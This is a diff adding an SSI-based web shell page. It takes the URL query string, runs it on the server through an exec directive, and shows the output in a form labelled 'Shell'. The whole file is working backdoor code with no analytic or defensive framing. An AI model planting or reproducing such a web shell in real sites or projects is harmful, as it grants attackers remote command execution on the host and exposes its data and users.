@@ -1,0 +1,25 @@
+<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="{echo,W0RK1N6}" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<script language="javascript">
+function fex()
+{
+document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+document.getElementById('command').value;
+}
+</script>
+
+<b><font color=blue>Enter command/address</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=command>&nbsp;<input type=button value=Run onclick=fex();>
+<br>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1>Shell</font></b></center>
+<br>
+<b><font color=blue>Output command</font></b>:&nbsp;&nbsp;&nbsp;<br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#exec cmd=$shl -->
+</textarea>
